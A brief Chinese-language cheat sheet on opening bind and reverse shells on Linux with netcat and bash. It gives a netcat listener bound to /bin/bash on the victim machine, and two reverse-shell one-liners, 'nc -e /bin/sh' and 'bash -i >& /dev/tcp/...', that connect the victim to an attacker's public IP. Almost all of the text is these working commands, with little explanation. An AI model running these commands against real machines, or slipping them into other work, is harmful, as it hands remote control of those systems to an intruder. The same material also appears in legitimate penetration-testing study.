# linux---正向反向shell

keywords: netcat nc 正向shell 反向shell  

## 正向shell
正向shell，在被攻击机器有公网ip时使用(假设靶机ip为1.2.3.4)  

在被攻击机器上执行命令：  
```bash
nc -l -p 8080 -e /bin/bash
```
攻击者执行命令连接shell：  
```bash
nc 1.2.3.4 8080
```


## 反弹shell
反弹shell，在被攻击机器位于内网时使用，需要攻击者有一个公网ip(假设公网ip是 1.2.3.4)  

攻击者在自己机器上监听端口，等待连接：  
```bash
nc -l -p 8080
```

在被攻击机器上使用nc或bash命令连接攻击者ip：  
```bash
# nc命令示例
nc -e /bin/sh 1.2.3.4 8080
# bash命令示例
bash -i >& /dev/tcp/1.2.3.4/8080 0>&1
```


2017/9/2  
2020/6/19  
